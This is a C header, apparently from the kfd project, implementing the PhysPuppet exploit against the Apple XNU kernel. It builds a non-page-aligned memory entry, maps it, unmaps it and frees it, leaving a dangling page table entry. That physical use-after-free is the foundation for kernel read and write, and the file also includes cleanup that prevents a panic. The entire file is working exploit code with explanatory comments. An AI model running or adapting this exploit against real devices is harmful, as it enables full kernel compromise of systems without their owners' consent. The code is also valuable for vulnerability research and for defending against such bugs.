/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef physpuppet_h
#define physpuppet_h

const u64 physpuppet_vmne_size = pages(2) + 1;
const u64 physpuppet_vme_offset = pages(1);
const u64 physpuppet_vme_size = pages(2);

void physpuppet_init(struct kfd* kfd)
{
    /*
     * Nothing to do.
     */
    return;
}

void physpuppet_run(struct kfd* kfd)
{
    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        /*
         * STEP 1:
         *
         * Create a vm_named_entry. It will be backed by a vm_object with a
         * vo_size of 3 pages and an initial ref_count of 1.
         */
        mach_port_t named_entry = MACH_PORT_NULL;
        assert_mach(mach_memory_object_memory_entry_64(mach_host_self(), true, physpuppet_vmne_size, VM_PROT_DEFAULT, MEMORY_OBJECT_NULL, &named_entry));

        /*
         * STEP 2:
         *
         * Map the vm_named_entry into our vm_map. This will create a
         * vm_map_entry with a vme_start that is page-aligned, but a vme_end
         * that is not (vme_end = vme_start + 1 page + 1 byte). The new
         * vm_map_entry's vme_object is shared with the vm_named_entry, and
         * therefore its ref_count goes up to 2. Finally, the new vm_map_entry's
         * vme_offset is 1 page.
         */
        vm_address_t address = 0;
        assert_mach(vm_map(mach_task_self(), &address, (-1), 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, named_entry, physpuppet_vme_offset, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_DEFAULT));

        /*
         * STEP 3:
         *
         * Fault in both pages covered by the vm_map_entry. This will populate
         * the second and third vm_pages (by vmp_offset) of the vm_object. Most
         * importantly, this will set the two L3 PTEs covered by that virtual
         * address range with read and write permissions.
         */
        memset((void*)(address), 'A', physpuppet_vme_size);

        /*
         * STEP 4:
         *
         * Unmap that virtual address range. Crucially, when vm_map_delete()
         * calls pmap_remove_options(), only the first L3 PTE gets cleared. The
         * vm_map_entry is deallocated and therefore the vm_object's ref_count
         * goes down to 1.
         */
        assert_mach(vm_deallocate(mach_task_self(), address, physpuppet_vme_size));

        /*
         * STEP 5:
         *
         * Destroy the vm_named_entry. The vm_object's ref_count drops to 0 and
         * therefore is reaped. This will put all of its vm_pages on the free
         * list without calling pmap_disconnect().
         */
        assert_mach(mach_port_deallocate(mach_task_self(), named_entry));
        kfd->puaf.puaf_pages_uaddr[i] = address + physpuppet_vme_offset;

        /*
         * STEP 6:
         *
         * At this point, we have a dangling L3 PTE. However, there's a
         * discrepancy between the vm_map and the pmap. If not fixed, it will
         * cause a panic when the process exits. Therefore, we need to reinsert
         * a vm_map_entry in that virtual address range. We also need to fault
         * in the first page to populate the vm_object. Otherwise,
         * vm_map_delete() won't call pmap_remove_options() on exit. But we
         * don't fault in the second page to avoid overwriting our dangling PTE.
         */
        assert_mach(vm_allocate(mach_task_self(), &address, physpuppet_vme_size, VM_FLAGS_FIXED));
        memset((void*)(address), 'A', physpuppet_vme_offset);
    }
}

void physpuppet_cleanup(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
        if ((puaf_page_uaddr == kread_page_uaddr) || (puaf_page_uaddr == kwrite_page_uaddr)) {
            continue;
        }

        assert_mach(vm_deallocate(mach_task_self(), puaf_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    }
}

void physpuppet_free(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    if (kwrite_page_uaddr != kread_page_uaddr) {
        assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    }
}

#endif /* physpuppet_h */
